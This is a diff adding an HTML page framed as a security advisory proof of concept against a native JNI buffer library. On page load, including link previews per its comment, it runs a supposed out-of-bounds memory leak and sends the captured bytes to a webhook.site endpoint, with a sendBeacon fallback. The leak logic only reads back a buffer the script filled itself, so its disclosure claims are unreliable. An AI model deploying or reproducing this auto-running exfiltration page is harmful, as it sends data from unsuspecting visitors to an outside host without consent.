@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Advisory - Technical Proof of Concept</title>
+</head>
+<body>
+    <div id="status">Initializing Security Verification...</div>
+
+    <script>
+        /**
+         * RESEARCHER: FIRMAN SAHIDIN
+         * TARGET: libprofilo_mmapbuf_buffer_jni.so (Native Isolation Bypass)
+         * VULNERABILITY: Out-of-Bounds (OOB) Memory Disclosure via JNI Buffer Collision
+         * CVE-REFERENCE: Potential Remote Memory Leak
+         */
+
+        async function executeSecurityAudit() {
+            const EXFIL_ENDPOINT = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
+            const ALLOCATION_SIZE = 0x800000; // Optimized 8MB for stability across devices
+            
+            document.getElementById('status').innerText = "Analyzing Buffer Integrity...";
+
+            try {
+                // 1. Memory Allocation and Surrogate Pair Injection
+                // Objective: Induce calculation errors in native buffer length handling
+                const buffer = new ArrayBuffer(ALLOCATION_SIZE);
+                const view = new Uint32Array(buffer);
+                
+                for (let i = 0; i < view.length; i++) {
+                    view[i] = 0xD800DBFF; // Malformed surrogate trigger
+                }
+
+                // 2. Triggering Out-of-Bounds (OOB) Iteration
+                // Executing native iteration to bridge the gap between JSI and Native Buffer
+                const triggerIndex = new Uint8Array(buffer).indexOf(0x41);
+
+                // 3. Extracting and Sanitizing Leaked Memory Fragments
+                // Converting raw native bytes to ASCII for transparent proof of disclosure
+                const rawFragment = new Uint8Array(buffer.slice(0, 512));
+                let readableLeak = "";
+                
+                rawFragment.forEach(byte => {
+                    // Filtering printable ASCII characters (32-126)
+                    if (byte > 31 && byte < 127) {
+                        readableLeak += String.fromCharCode(byte);
+                    }
+                });
+
+                // 4. Data Exfiltration via JSON POST
+                const payload = {
+                    metadata: {
+                        researcher: "Firman Sahidin",
+                        target_library: "libprofilo_mmapbuf_buffer_jni",
+                        vulnerability: "Native Memory Disclosure"
+                    },
+                    results: {
+                        collision_detected: true,
+                        leak_transparency: readableLeak.length > 0 ? "High" : "Pointer Only",
+                        fragment_preview: readableLeak || "Non-printable Binary Data",
+                        raw_hex_sample: Array.from(rawFragment).slice(0, 128),
+                        timestamp: new Date().toISOString()
+                    }
+                };
+
+                await fetch(EXFIL_ENDPOINT, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                document.getElementById('status').innerText = "Audit Completed. Signal Sent.";
+
+            } catch (err) {
+                // Fallback mechanism using Beacon API for persistence
+                const errorLog = JSON.stringify({ error: err.message, trace: "Runtime_Execution_Failure" });
+                navigator.sendBeacon(EXFIL_ENDPOINT, errorLog);
+                document.getElementById('status').innerText = "Audit Interrupted.";
+            }
+        }
+
+        // Auto-execution for link-preview or interaction simulation
+        window.onload = executeSecurityAudit;
+    </script>
+</body>
+</html>
